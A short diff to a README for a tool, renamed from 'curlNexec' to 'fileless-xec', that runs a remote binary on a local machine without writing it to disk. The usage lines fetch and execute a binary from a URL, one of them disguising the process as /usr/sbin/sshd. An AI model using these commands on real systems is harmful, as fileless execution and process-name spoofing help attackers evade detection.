@@ -9,7 +9,7 @@
 
 ## Short story
 
-`curlNexec` enable us to execute a remote binary on a local machine in one step
+`fileless-xec` enable us to execute a remote binary on a local machine in one step without dropping them on disk
 
  - simple usage `fileless-xec <binary_url>`
  - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd <binary_raw_url>`
